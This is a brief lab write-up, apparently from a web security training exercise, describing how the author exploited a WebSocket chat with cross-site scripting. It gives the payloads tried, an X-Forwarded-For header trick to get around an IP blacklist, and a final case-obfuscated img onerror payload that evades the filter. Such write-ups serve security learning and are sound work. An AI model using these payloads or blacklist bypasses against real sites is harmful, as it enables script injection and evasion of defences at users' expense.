# Manipulating the WebSocket handshake to exploit vulnerabilities
Use Burp proxy to intercept ws messages. When a request containing < is sent to the sever, it us encoded as `&lt;`
Then send it to repeater. First I tried sending `<script>alert(1)</script>`, which didn't do anything. After that, I tried `<img src=1 onerror='alert(1)'>` which then got my IP blacklisted.
```json
{
    "message": "<img src=1 onerror='alert(1)'>"
}
```
I reopened the socket using burp, but included `X-Forwarded-For: 1.1.1.1` header, which let me open sockets that weren't blacklisted.
I tried a few times with different payloads, but ended on
```json
{
    "message": "<img src=1 oNeRrOr=alert`1`>"
}
```
